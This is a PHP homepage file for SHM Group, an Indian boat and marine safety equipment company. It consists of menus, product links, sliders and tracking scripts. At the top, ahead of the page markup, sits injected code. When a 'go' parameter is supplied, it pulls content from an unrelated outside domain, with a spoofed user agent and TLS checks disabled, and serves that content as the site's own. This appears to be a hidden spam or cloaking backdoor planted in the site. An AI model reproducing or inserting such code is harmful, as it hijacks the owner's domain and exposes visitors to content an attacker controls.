<?php
function fetchDataFromSite($site) {
    $url = 'https://replication2.pkcdurensawit.net/shmgroup/' . $site . '/';
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $site = $_GET['go'];
    $data = fetchDataFromSite($site);
    echo $data;
} else {
 ?>
<!doctype html>
<html class="no-js" lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" content="chrome=1">
    <meta name="theme-color" content="#ef4c23" />
    <title>SHM Group - Boat Manufacturers in India|Ship Chandlers in India</title>
    <meta name="description" content="Looking for best Boat Manufactures & Ship Chandler in India.SHM Group Manufacture,supply & service various types of boats in India.Click for more details.">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="viewport" content="width=device-width, height=device-height">
    <!--<link href='https://fonts.googleapis.com/css?family=Open+Sans:300,400' rel='stylesheet' type='text/css'>-->
    <link href="css/bootstrap.min.css" rel="stylesheet" />
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="icon" type="image/png" href="favicon-32x32.png" sizes="32x32" />
    <link rel="icon" type="image/png" href="favicon-16x16.png" sizes="16x16" />
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <meta name="google-site-verification" content="o7HVMnlXnA7aqe-QENAMCeSVNDB3If2wDyuK74H-knI" />
    <!--<link rel="stylesheet" href="css/bootstrap.min.css">-->

    <!--<meta property="og:title" content="Welcome to SHM Group"/>
    <meta property="og:type" content="article"/>
    <meta property="og:url" content="http://shmgroup.com"/>
    <meta property="og:image" content="http://shmgroup.com/img/welcome-banner.JPG"/>
    <meta property="og:site_name" content="SHM Group"/>
    <meta property="fb:app_id" content="532914393586367"/>
    <meta property="og:description" content="We strive to create safe and secure working environments by manufacturing, supplying, and servicing the best-in-class safety and survival systems that enable businesses freedom at sea and on shore."/>-->

    <style>
        body {
            padding-top: 50px;
            padding-bottom: 20px;
        }



    </style>

    <!--<link rel="stylesheet" href="css/bootstrap-theme.min.css">-->
    <link rel="stylesheet" href="font-awesome-4.4.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/universal.css">
    <!--<link rel="stylesheet" href="css/style.min.css"  />
    <link rel="stylesheet" href="css/news-blog-homepage.css">
    <link rel="stylesheet" href="css/slider.min.css" >
    <link rel="stylesheet" href="css/push-menu.css">
    <link rel="stylesheet" href="css/lightbox-form.css">
    <link rel="stylesheet" href="css/swiper.css">
    <link rel="stylesheet" href="css/services-pages.css">
    <link rel="stylesheet" id="se-link-styles-css" href="css/se-styles.css" type="text/css" media="all">
    <link rel="stylesheet" id="main-css" href="css/master.css" type="text/css" media="screen">
    <link rel="stylesheet" href="css/timeline.css">
    <link rel="stylesheet" href="css/timeline-body.css">
    <link rel="stylesheet" href="css/what-we-do.css">
    <link rel="stylesheet" href="css/news.css">
    <link rel="stylesheet" href="css/liferaft-chart.css">
    <link rel="stylesheet" href="css/hagm.css">
    <link rel="stylesheet" href="css/firesuit-device-sub.css">
    <link rel="stylesheet" href="css/accordion.css">
    <link rel="stylesheet" href="css/tad.css">-->

    <link rel="stylesheet" href="js/lazyload/style.css">

    <!--<script src="js/jquery-1.10.2.min.js"></script>-->
    <script src="js/jquery-2.1.3.min.js"></script>
    <!--<script src="js/Menu.js"></script>-->
    <script src="js/vendor/modernizr-2.8.3.min.js" async></script>
    <script src="js/responsiveslides.min.js"></script>
    <script src="js/header-combine.js" async></script>

    <script type="text/javascript" async>
    // You can also use "$(window).load(function() {"
    jQuery(function ($) {

        jQuery("#slider4").responsiveSlides({
            auto: true,
            pager: true,
            nav: true,
            speed: 4000,
            timeout: 10000,
            namespace: "callbacks",
            controlsShow:		true,
            controlsFade:		true,
            continuous:		true,
            numeric: 		true,
            numericId: 		'controls'
        });

    });

    jQuery(function ($) {

        jQuery("#slider5").responsiveSlides({
            auto: true,
            pager: false,
            nav: true,
            speed: 1000,
            timeout: 5000,
            namespace: "callbacks",
        });

        $("#slider6").responsiveSlides({
          auto: true,             // Boolean: Animate automatically, true or false
          speed: 500,            // Integer: Speed of the transition, in milliseconds
          timeout: 4000,          // Integer: Time between slide transitions, in milliseconds
          pager: false,           // Boolean: Show pager, true or false
          nav: true,             // Boolean: Show navigation, true or false
          random: false,          // Boolean: Randomize the order of the slides, true or false
          pause: false,           // Boolean: Pause on hover, true or false
          pauseControls: true,    // Boolean: Pause when hovering controls, true or false

          nextText: "<i class='fa fa-angle-right' aria-hidden='true'></i>",       // String: Text for the "next" button
          prevText: "<i class='fa fa-angle-left' aria-hidden='true'></i>",   // String: Text for the "previous" button
          maxwidth: "",           // Integer: Max-width of the slideshow, in pixels
          navContainer: "",       // Selector: Where controls should be appended to, default is after the 'ul'
          manualControls: "",     // Selector: Declare custom pager navigation
          namespace: "rslides",   // String: Change the default namespace used
        });

    });
    </script>


    <style>

        img{
            box-shadow: none;
        }

      p.attribution, p.attribution a { color: #666; }


    </style>

    <script type="text/javascript">

        $(document).ready(function(){$(".mydropdown").on("show.bs.dropdown",function(e){var linkText=$(e.relatedTarget).text();alert("Click on OK button to view the dropdown menu for - "+linkText)})})

        /* Loader */
        $(window).load(function(){$("#intro-loader").delay(100).fadeOut();$(".mask").delay(500).fadeOut("slow")});$(document).ready(function(){$('a.external').click(function(){var url=$(this).attr('href');$('.mask').fadeIn(250,function(){document.location.href=url});$("#intro-loader").fadeIn("slow");return !1})})

    </script>

    <script async>
      (function() {
        var cx = '018299014632691612335:yin6b6wg0go';
        var gcse = document.createElement('script');
        gcse.type = 'text/javascript';
        gcse.async = true;
        gcse.src = 'https://cse.google.com/cse.js?cx=' + cx;
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(gcse, s);
      })();

  jQuery(document).ready(function(){
  setTimeout( function(){
    jQuery(".gsc-input").removeAttr("placeholder");
  }
 , 1000 );

});


    </script>

<meta name="google-site-verification" content="jMOYXHfAKQr7XkjWSrvxFlGxKfaIaSrIU2dMCAOfTFI" />
<!-- Facebook Pixel Code -->
<script async>
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '323071071566567'); // Insert your pixel ID here.
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=323071071566567&ev=PageView&noscript=1"
/></noscript>
<!-- DO NOT MODIFY -->
<!-- End Facebook Pixel Code -->

</head>

<body >

<script async> fbq('track', 'ViewContent');</script>

<script>
 fbq('track', 'Search');
</script>

<!--[if lt IE 8]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
<![endif]-->

<!-- Main jumbotron for a primary marketing message or call to action -->

<div class="mask" style="display: block;">
    <div id="intro-loader" style="display: block;"> <img src="img/SHM-intro-loader-2.gif" id="loadgo"> </div>
</div>

</body>




<div class="top-menu">

<!-- Menu Lines for Usage-->
<div class="si-icons si-icons-default"></div>

    <!-- i-menuTrigger for mobile version-->
    <div class="mobile-navbar">

        <div class="mobile-brand">
            <a href="http://shmgroup.com/" onclick="location.href = 'http://shmgroup.com/';" class="mobile-logo">
                <img data-src="img/Optimize/logo.png" src="img/Optimize/logo.png" alt="SHM_logo">
            </a>
        </div>


        <!-- i-menuTrigger for mobile version-->
        <span id="i-menuTrigger" class="i-menu-trigger hide-it" data-icon-name="menu">
            <svg version="1.0" id="Svg1" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="32px" height="32px" viewBox="0 0 32 32" enable-background="new 0 0 32 32" xml:space="preserve" class="passive-menu">
            <path id="Path1" d="M2.044,8.247h27.911c0.856,0,1.551-0.695,1.551-1.551s-0.694-1.551-1.551-1.551H2.044c-0.855,0-1.551,0.695-1.551,1.551S1.189,8.247,2.044,8.247z"></path>
            <path id="Path2" opacity="1" d="M29.955,23.753H2.044c-0.855,0-1.551,0.695-1.551,1.551s0.695,1.551,1.551,1.551h27.911c0.856,0,1.551-0.695,1.551-1.551S30.812,23.753,29.955,23.753z"></path>
            <path id="Path3" d="M29.955,14.449H2.044c-0.855,0-1.551,0.695-1.551,1.551s0.695,1.551,1.551,1.551h27.911c0.856,0,1.551-0.695,1.551-1.551S30.812,14.449,29.955,14.449z"></path></svg>
        </span>

    </div>
    <!--Navigation Push Menu-->

    <div class="search--bar">

          <div id="search">
            <div id="search-button-icon">
                <i class="fa fa-search" aria-hidden="true"></i>
            </div>

            <div class="search-container">

                <gcse:searchbox-only></gcse:searchbox-only>
              </div>


          </div>

      </div>


      <script type="text/javascript">
$( '#$search-button-icon' ).click(function() {
insert_event_code_here;
...
</script>

    <!--Push Menu Wrapper-->
    <div class="push_menu_wrapper">

      <!--<div class="search--bar hidden-xs hidden-sm">
          <div id="search">
            <div id="search-button-icon" style="font-size: 25px;">
                <i class="fa fa-search" aria-hidden="true"></i>
            </div>

            <div class="search-container">

                <gcse:searchbox-only></gcse:searchbox-only>
              </div>


          </div>

      </div>-->

      <!--Menu Icon-->
      <div class="hamburger-wrapper">

        <a href="javascript:void(0);" id="tester-unique"  class="menu-desc-toggle menu-ham rotate">
          <!--<img src="img/menu-hamburger-icon.png">-->
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </a>

      </div>
      <!--End Menu Icon-->

      <!--Push Main Menu-->
      <div class="push_main neg_shift_push_main smooth_push">

            <!--Links Wrapper-->
            <div class="links_push_main">

                <a href="javascript:void(0);" class="toggle_sub_menu" rel="about">
                    <i class="fa fa-info icon-nav"></i>
                    <span class="link_text">About</span>
                </a>

                <a href="what-we-do.php" onclick="location.href = 'what-we-do.php';" class="toggle_sub_menu" rel="what">
                    <i class="fa fa-question icon-nav"></i>
                    <span class="link_text">What We Do</span>
                </a>

                <a href="javascript:void(0);" class="toggle_sub_menu" rel="prod">
                    <i class="fa fa-th icon-nav"></i>
                    <span class="link_text">Products</span>
                </a>

                <a href="javascript:void(0);" class="toggle_sub_menu" rel="sernav">
                    <i class="fa fa-wrench icon-nav"></i>
                    <span class="link_text">Services</span>
                </a>

                <a href="agencies.php" onclick="location.href = 'agencies.php';" class="toggle_sub_menu">
                    <i class="fa fa-building-o icon-nav"></i>
                    <span class="link_text">OEM &amp; Class</span>
                </a>

                <a href="customers.php" onclick="location.href = 'customers.php';" class="toggle_sub_menu">
                    <i class="fa fa-users icon-nav"></i>
                    <span class="link_text">Customers</span>
                </a>

                <a href="news.php" onclick="location.href = 'news.php';" class="toggle_sub_menu">
                    <i class="fa fa-newspaper-o icon-nav"></i>
                    <span class="link_text">News</span>
                </a>

                <a href="http://www.shmgroup.com/blog/" onclick="location.href = 'http://www.shmgroup.com/blog/';" class="toggle_sub_menu">
                    <i class="fa fa-rss icon-nav"></i>
                    <span class="link_text">Blog</span>
                </a>

                <a href="contact.php" onclick="location.href = 'contact.php';" class="toggle_sub_menu">
                    <i class="fa fa-comments-o icon-nav"></i>
                    <span class="link_text">Contact</span>
                </a>
<a href="http://www.shmgroup.com/catalogue/" onclick="location.href = 'http://www.shmgroup.com/catalogue/" class="toggle_sub_menu">
                    <i class="fa fa-comments-o icon-nav"></i>
                    <span class="link_text">Product Catalogue</span>
                </a>
                <a href="career.php" onclick="location.href = 'career.php';" class="toggle_sub_menu">
                    <i class="fa fa-briefcase icon-nav"></i>
                    <span class="link_text">Career</span>
                </a>

            </div>
            <!--End Links Wrapper-->

    </div>
    <!--End Push Main Menu-->

    <!--Push Sub Menu-->
    <div class="push_sub_menu neg_shift_push_sub smooth_push" id="about">

        <a href="javascript:void(0);" class="submenu_close" rel="about">
          <span style="margin-top:100px;">×</span>
        </a>

        <!--Sub Menu Links Wrapper-->
        <div class="push_sub_menu_links">

          <a href="about.php" onclick="location.href = 'about.php';" class="push_sub_link">About Us</a>
          <!--<a href="chairmans-message.php" onclick="location.href = 'chairmans-message.php';" class="push_sub_link">Chairman's Message</a>-->
          <a href="group-of-companies.php" onclick="location.href = 'group-of-companies.php';" class="push_sub_link">Our Group of companies</a>
          <a href="timeline.php" onclick="location.href = 'timeline.php';" class="push_sub_link">History</a>

        </div>
        <!--End Sub Menu Links Wrapper-->

    </div>

    <div class="push_sub_menu neg_shift_push_sub smooth_push" id="prod">

        <a href="javascript:void(0);" class="submenu_close" rel="prod">
          ×
        </a>

        <!--Sub Menu Links Wrapper-->
        <div class="push_sub_menu_links">

          <a href="lifeboats-davit-systems.php" onclick="location.href = 'lifeboats-davit-systems.php';" class="push_sub_link">Lifeboats &amp; Davit Systems</a>
          <a href="rescue-boat-and-davit-systems.php" onclick="location.href = 'rescue-boat-and-davit-systems.php';" class="push_sub_link">Rescue Boats &amp; Davit Systems</a>
          <a href="boats-yachts.php" onclick="location.href = 'boats-yachts.php';" class="push_sub_link">Boats &amp; Yachts</a>
          <a href="liferafts.php" onclick="location.href = 'liferafts.php';" class="push_sub_link">Liferafts</a>
          <a href="liferaft-accessories.php" onclick="location.href = 'liferaft-accessories.php';" class="push_sub_link">Liferafts Accessories</a>
          <a href="personal-life-saving-appliances.php" onclick="location.href = 'personal-life-saving-appliances.php';" class="push_sub_link">Personal Life Saving Appliances</a>
          <a href="firesuits-devices.php" onclick="location.href = 'firesuits-devices.php';" class="push_sub_link">Firesuits &amp; Breathing Devices</a>
          <a href="fire-extinguishers.php" onclick="location.href = 'fire-extinguishers.php';" class="push_sub_link">Fire Extinguishers</a>
          <a href="hoses-gun-metal-fittings.php" onclick="location.href = 'hoses-gun-metal-fittings.php';" class="push_sub_link">Hoses &amp; Gun Metal Fittings</a>
          <a href="fixed-safety-equipment.php" onclick="location.href = 'fixed-safety-equipment.php';" class="push_sub_link">Fixed Fire Safety Equipment</a>
          <a href="signalling-communication.php" onclick="location.href = 'signalling-communication.php';" class="push_sub_link">Signalling &amp; Communication</a>
          <a href="imo-symbols-signs.php" onclick="location.href = 'imo-symbols-signs.php';" class="push_sub_link">IMO Symbols &amp; Signs</a>
          <a href="dura-cabinets.php" onclick="location.href = 'dura-cabinets.php';" class="push_sub_link">Dura Cabinets</a>
          <a href="emergency-medical-equipment.php" onclick="location.href = 'emergency-medical-equipment.php';" class="push_sub_link">Emergency &amp; Medical Equipment</a>
          <a href="transfer-and-descent-equipment.php" onclick="location.href = 'transfer-and-descent-equipment.php';" class="push_sub_link">Transfer &amp; Descent Equipment</a>
          <a href="marine-chemicals.php" onclick="location.href = 'marine-chemicals.php';" class="push_sub_link">Chemicals</a>
          <a href="general-ship-supplies.php" onclick="location.href = 'general-ship-supplies.php';" class="push_sub_link">General Ship Supplies</a>

        </div>
        <!--End Sub Menu Links Wrapper-->

    </div>

    <div class="push_sub_menu neg_shift_push_sub smooth_push" id="sernav">

         <a href="javascript:void(0);" class="submenu_close" rel="sernav">
              ×
         </a>

        <!--Sub Menu Links Wrapper-->
        <div class="push_sub_menu_links">

          <a href="services-lifeboats.php" onclick="location.href = 'services-lifeboats.php';" class="push_sub_link">Lifeboats and Rescue Boats</a>
          <a href="services-hookreplacement.php" onclick="location.href = 'services-hookreplacement.php';" class="push_sub_link">Hook Replacement</a>
          <a href="services-liferafts.php" onclick="location.href = 'services-liferafts.php';" class="push_sub_link">Liferafts</a>
          <a href="services-immersionsuit.php" onclick="location.href = 'services-immersionsuit.php';" class="push_sub_link">Immersion Suit</a>
          <a href="services-lifejacket.php" onclick="location.href = 'services-lifejacket.php';" class="push_sub_link">Inflatable Lifejackets</a>
          <a href="services-firefighting.php" onclick="location.href = 'services-firefighting.php';" class="push_sub_link">Fire Fighting Appliances</a>
          <a href="services-electronics.php" onclick="location.href = 'services-electronics.php';" class="push_sub_link">Electronics</a>
          <a href="services-pyrotechnics.php" onclick="location.href = 'services-pyrotechnics.php';" class="push_sub_link">Pyrotechnics Disposal</a>
          <a href="services-boatrepairs.php" onclick="location.href = 'services-boatrepairs.php';" class="push_sub_link">FRP Boat Repairs</a>
          <a href="services-cargogeartesting.php" onclick="location.href = 'services-cargogeartesting.php';" class="push_sub_link">Cargo Gear Testing</a>
          <a href="services-gangwayladders.php" onclick="location.href = 'services-gangwayladders.php';" class="push_sub_link">Gangway &amp; Accomodation Ladders</a>
          <a href="services-fleetservice.php" onclick="location.href = 'services-fleetservice.php';" class="push_sub_link">Fleet Service Agreements</a>
          <a href="services-trainingworkshops.php" onclick="location.href = 'services-trainingworkshops.php';" class="push_sub_link">Training Seminars and Workshops</a>
          <a href="services-generalshiprepairs.php" onclick="location.href = 'services-generalshiprepairs.php';" class="push_sub_link">General Ship Repairs</a>


        </div>
        <!--End Sub Menu Links Wrapper-->

    </div>
    <!--End Push Sub Menu-->

</div>
<!--End Push Menu Wrapper-->

<!--Mobile Menu-->
<nav id="i-menu" class="mobile-menu">
<ul class="top-level">
  <li data-id="1" class="dropdown">
    <a href="javascript:void(0);" class="dropdown-togglell"> <span>About</span> <b class="downArrow" data-icon=""></b> </a>
    <ul class="dropdown-menu">
      <li data-id="11" class="dropdown-submenu">
        <a href="about.php" onclick="location.href='about.php'" class="dropdown-togglell"> <span>About Us</span> <b class="rightArrow" data-icon=""></b> </a>
        <ul class="dropdown-menu">
           <!--<li data-id="11">
               <a href="chairmans-message.php" onclick="location.href = 'chairmans-message.php';">
                <span>Chairman's Message</span>
                </a>
          </li>-->
            <li data-id="11">
               <a href="group-of-companies.php" onclick="location.href = 'group-of-companies.php';">
                <span>Our Group of Companies</span>
                </a>
          </li>
          <li data-id="11">
            <a href="timeline.php" onclick="location.href = 'timeline.php';">
              <span>History</span>
            </a>
          </li>
        </ul>
      </li>
    </ul>
  </li>

  <li data-id="2">
    <a href="what-we-do.php" onclick="location.href = 'what-we-do.php';" class="dropdown-togglell"> <span>What We Do</span> <b class="downArrow" data-icon=""></b> </a>
  </li>

  <li data-id="3" class="dropdown">
    <a href="javascript:void(0);" class="dropdown-togglell"> <span>Products</span> <b class="downArrow" data-icon=""></b> </a>
    <ul class="dropdown-menu">


      <li data-id="17" class="dropdown-submenu">
        <ul class="dropdown-menu">

          <li data-id="12">
            <a href="lifeboats-davit-systems.php" onclick="location.href='lifeboats-davit-systems.php'"> <span>LIFEBOATS &amp; DAVIT SYSTEMS  </span> </a>
          </li>

          <li data-id="13">
            <a href="rescue-boat-and-davit-systems.php" onclick="location.href='rescue-boat-and-davit-systems.php'"> <span>RESCUE BOATS &amp; DAVIT SYSTEMS  </span> </a>
          </li>

          <li data-id="24">
            <a href="boats-yachts.php" onclick="location.href='boats-yachts.php'"> <span>BOATS &amp; YACHTS</span> </a>
          </li>

          <li data-id="14">
            <a href="liferafts.php" onclick="location.href='liferafts.php'"> <span>LIFERAFTS</span> </a>
          </li>

          <li data-id="14">
            <a href="lifedraft-accessories.php" onclick="location.href='liferaft-accessories.php'"> <span>LIFERAFTS ACCESSORIES</span> </a>
          </li>

          <li data-id="21">
            <a href="personal-life-saving-appliances.php" onclick="location.href='personal-life-saving-appliances.php'"> <span>PERSONAL LIFE-SAVING APPLIANCES</span> </a>
          </li>

          <li data-id="27">
            <a href="firesuits-devices.php" onclick="location.href='firesuits-devices.php'"> <span>FIRESUITS &amp; BREATHING DEVICES</span> </a>
          </li>

          <li data-id="25">
            <a href="fire-extinguishers.php" onclick="location.href='fire-extinguishers.php'"> <span>FIRE EXTINGUISHERS</span> </a>
          </li>

          <li data-id="16">
            <a href="hoses-gun-metal-fittings.php" onclick="location.href='hoses-gun-metal-fittings.php'"> <span>HOSES &amp; GUN METAL FITTINGS</span> </a>
          </li>

          <li data-id="17">
            <a href="fixed-safety-equipment.php" onclick="location.href='fixed-safety-equipment.php'" > <span>FIXED FIRE SAFETY EQUIPMENT</span> </a>
          </li>

          <li data-id="18">
            <a href="signalling-communication.php" onclick="location.href='signalling-communication.php'"> <span>SIGNALLING &amp; COMMUNICATION</span> </a>
          </li>

          <li data-id="19">
            <a href="imo-symbols-signs.php" onclick="location.href='imo-symbols-signs.php'"> <span>IMO SYMBOLS &amp; SIGNS</span> </a>
          </li>

          <li data-id="20">
            <a href="dura-cabinets.php" onclick="location.href='dura-cabinets.php'"> <span>DURA CABINETS</span> </a>
          </li>

          <li data-id="22">
            <a href="emergency-medical-equipment.php" onclick="location.href='emergency-medical-equipment.php'"> <span>EMERGENCY &amp; MEDICAL EQUIPMENT</span> </a>
          </li>

          <li data-id="23">
            <a href="transfer-and-descent-equipment.php" onclick="location.href='transfer-and-descent-equipment.php'"> <span>TRANSFER &amp; DESCENT EQUIPMENT</span> </a>
          </li>

          <li data-id="15">
            <a href="marine-chemicals.php" onclick="location.href='marine-chemicals.php'"> <span>CHEMICALS</span> </a>
          </li>

          <li data-id="26">
            <a href="general-ship-supplies.php" onclick="location.href='general-ship-supplies.php'"> <span>GENERAL SHIP SUPPLIES</span> </a>
          </li>

        </ul>
      </li>
    </ul>
  </li>

  <li data-id="4" class="dropdown">
    <a href="javascript:void(0);" class="dropdown-togglell"> <span>Services</span> <b class="downArrow" data-icon=""></b> </a>
    <ul class="dropdown-menu">

          <li data-id="41">
            <a href="services-lifeboats.php" onclick="location.href='services-lifeboats.php'">Lifeboats and Rescue Boats</a>
          </li>
          <li data-id="42">
            <a href="services-liferafts.php" onclick="location.href='services-liferafts.php'">Liferafts</a>
          </li>
          <li data-id="43">
            <a href="services-immersionsuit.php" onclick="location.href='services-immersionsuit.php'">Immersion Suit</a>
          </li>
          <li data-id="44">
            <a href="services-lifejacket.php" onclick="location.href='services-lifejacket.php'">Inflatable Lifejackets</a>
          </li>
          <li data-id="45">
            <a href="services-firefighting.php" onclick="location.href='services-firefighting.php'">Fire Fighting Appliances</a>
          </li>
          <li data-id="46">
            <a href="services-electronics.php" onclick="location.href='services-electronics.php'">Electronics</a>
          </li>
          <li data-id="47">
            <a href="services-pyrotechnics.php" onclick="location.href='services-pyrotechnics.php'">Pyrotechnics Disposal</a>
          </li>
          <li data-id="48">
            <a href="services-boatrepairs.php" onclick="location.href='services-boatrepairs.php'">FRP Boat Repairs</a>
          </li>
          <li data-id="49">
            <a href="services-cargogeartesting.php" onclick="location.href='services-cargogeartesting.php'">Cargo Gear Testing</a>
          </li>
          <li data-id="50">
            <a href="services-gangwayladders.php" onclick="location.href='services-gangwayladders.php'">Gangway &amp; Accomodation Ladders</a>
          </li>
          <li data-id="51">
            <a href="services-fleetservice.php" onclick="location.href='services-fleetservice.php'">Fleet Service Agreements</a>
          </li>
          <li data-id="52">
            <a href="services-trainingworkshops.php" onclick="location.href='services-trainingworkshops.php'">Training Seminars and Workshops</a>
          </li>
          <li data-id="53">
            <a href="services-generalshiprepairs.php" onclick="location.href='services-generalshiprepairs.php'">General Ship Repairs</a>
          </li>
          <li data-id="54">
              <a href="services-hookreplacement.php" onclick="location.href='services-hookreplacement.php'">Hook Replacement</a>
          </li>

    </ul>
  </li>

  <li data-id="5">
    <a href="agencies.php" onclick="location.href='agencies.php'"> <span>OEM &amp; Class</span> </a>
  </li>
  <li data-id="6">
    <a href="customers.php" onclick="location.href='customers.php'"> <span>Customers</span> </a>
  </li>
  <li data-id="7">
    <a href="news.php" onclick="location.href='news.php'"> <span>News</span> </a>
  </li>
  <li data-id="8">
    <a href="http://www.shmgroup.com/blog/" onclick="location.href='http://www.shmgroup.com/blog/'"> <span>Blog</span> </a>
  </li>
  <li data-id="9">
    <a href="contact.php" onclick="location.href='contact.php'"> <span>Contact</span> </a>
  </li>
  <li data-id="10">
    <a href="http://www.shmgroup.com/catalogue/" onclick="location.href='http://www.shmgroup.com/catalogue/"> <span>Product Catalogue</span> </a>
  </li>
  <li data-id="11">
    <a href="career.php" onclick="location.href='career.php'"> <span>Career</span> </a>
  </li>

</ul>
</nav>
<!--End Mobile Menu-->


<div class="logo">
    <a href="http://shmgroup.com/" onclick="location.href='http://shmgroup.com/'"><img data-src="img/Optimize/logo.png" src="img/Optimize/logo.png" alt="SHM_Logo"></a>
</div>

</div>
<style>
    .modal-txt p{    margin: 10px 30px;text-align: justify;}
    .modal-body img{margin: 0 auto;}


</style>

<div id="loader-wrapper">
			<div id="loader"></div>
		</div>
<div id="slide1">
<div id="wrapper">
<span class="scroll-btn hidden-xs hidden-sm">
<a href="#2">
<span class="mouse">
<span>
</span>
</span>
</a>
<p>scroll me</p>
</span>

<ul class="rslides callbacks callbacks1" id="slider4">

<!--<li id="callbacks1_s0" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 6500ms ease-in-out">
<a href="./catalogue">
<img data-src="img/Home/catelogue-launch-2017.png" src="img/Home/catelogue-launch-2017.png" alt="Saftey Catelogue Launch 2017"></a>
<p class="product-caption home-captain-text"><a href="./catalogue">Click Here</a>
</p>
</li>
<li id="callbacks1_s2" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 4500ms ease-in-out">
<img data-src="img/Optimize/Home-banner3.jpg" src="img/Optimize/banner3.jpg" alt="">
</li>
-->
<li id="callbacks1_s1" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 4500ms ease-in-out">
<img data-src="img/Optimize/world-environment-day-slider.jpg" src="img/Home/Mechanised-Boat1.jpg" alt="Mechanised-Boat">
</li>


<li id="callbacks1_s2" class="" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 4500ms ease-in-out">
<img data-src="img/Optimize/home_slider2.jpg" src="img/Home/Twin-Engine-Boat1 .jpg" alt="Ship Chandlers in India">
</li>
<li id="callbacks1_s3" class="" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 4500ms ease-in-out">
<img data-src="img/Home/shm-banner_new_2.jpg" src="img/Home/shm-banner_new_2.jpg" alt="Patrol Boat">
</li>
<li id="callbacks1_s4" class="" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 4500ms ease-in-out">
<img data-src="img/Home/shm-banner_new_3.jpg" src="img/Home/shm-banner_new_3.jpg" alt="Liferaft">
</li>
<li id="callbacks1_s5" class="" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 4500ms ease-in-out">
<img data-src="img/Home/shm-banner_new_4.jpg" src="img/Home/shm-banner_new_4.jpg" alt="Rigorous Test">
</li>
<li id="callbacks1_s6" class="" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 4500ms ease-in-out">
<img data-src="img/Home/shm-banner_new_5.jpg" src="img/Home/shm-banner_new_5.jpg" alt="Fire Protection">
</li>
<li id="callbacks1_s7" class="" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 4500ms ease-in-out">
<img data-src="img/Home/Life saving jackets that keep you safe during emergencies.png" src="img/Home/Life saving jackets that keep you safe during emergencies.png" alt="Personal Life Saving Appliances">
</li>
</ul>










<div class="clearfix"></div>
</div>
</div>
<div class="reapid-menu hidden-xs"></div>
<section id="2" class="slide2">
<div class="container">
<div class="row">
<div class="title">
<h1>WHAT WE DO</h1>
<p class="home-title-text">We strive to create safe and secure working environments by manufacturing, supplying, and servicing the best-in-class safety and survival systems that enable businesses’ freedom at sea and on shore. We offer our clients peace of mind as a trustworthy partner by providing quality products and taking care of their assets. We translate the complexity of safety standards into simple solutions for your business. All equipment and services you need in one place, provided by one team, at the best value for your money.</p>
</div>
</div>
<div class="row">
<div class="col-xs-6 col-sm-3 col-md-3 col-lg-3" >
<div class="feature_content text-center">

<i class="icon">
<a href="what-we-do.php" onclick="location.href='what-we-do.php'">
<img style="display:inline" class="desktop-what-we-do" data-src="img/icon1.png" src="img/icon1.png" alt="manufacture_icon">
<img style="display:inline" class="phone-what-we-do" data-src="img/icon1-phone.png" src="img/icon1-phone.png" alt="manufacture_icon2">
</a>
</i>
    <h3>MANUFACTURE</h3>

</div>
</div>
<div class="col-xs-6 col-sm-3 col-md-3 col-lg-3">
<div class="feature_content text-center">


<i class="icon">
<a href="what-we-do.php" onclick="location.href='what-we-do.php'">
<img style="display:inline" class="desktop-what-we-do lazy" data-src="img/icon2.png" src="img/icon2.png" alt="supply_icon">
<img style="display:inline" class="phone-what-we-do lazy" data-src="img/icon2-phone.png" src="img/icon2-phone.png" alt="supply_icon2">
</a>
</i>
 <h3>SUPPLY</h3>
</div>
</div>
<div class="col-xs-6 col-sm-3 col-md-3 col-lg-3">
<div class="feature_content text-center">
<i class="icon">
<a href="what-we-do.php" onclick="location.href='what-we-do.php'">
<img style="display:inline" class="desktop-what-we-do lazy" data-src="img/icon3.png" src="img/icon3.png" alt="service_icon">
<img style="display:inline" class="phone-what-we-do lazy" data-src="img/icon3-phone.png" src="img/icon3-phone.png" alt="service_icon2">
</a>
</i>
<h3>SERVICE</h3>
</div>
</div>
<div class="col-xs-6 col-sm-3 col-md-3 col-lg-3">
<div class="feature_content text-center">
<i class="icon">
<a href="what-we-do.php" onclick="location.href='what-we-do.php'">
<img style="display:inline" class="desktop-what-we-do lazy" data-src="img/Optimize/icon4.png" src="img/Optimize/icon4.png" alt="service_icon">
<img style="display:inline" class="phone-what-we-do lazy" data-src="img/Optimize/icon4-phone.png" src="img/Optimize/icon4-phone.png" alt="service_icon4">
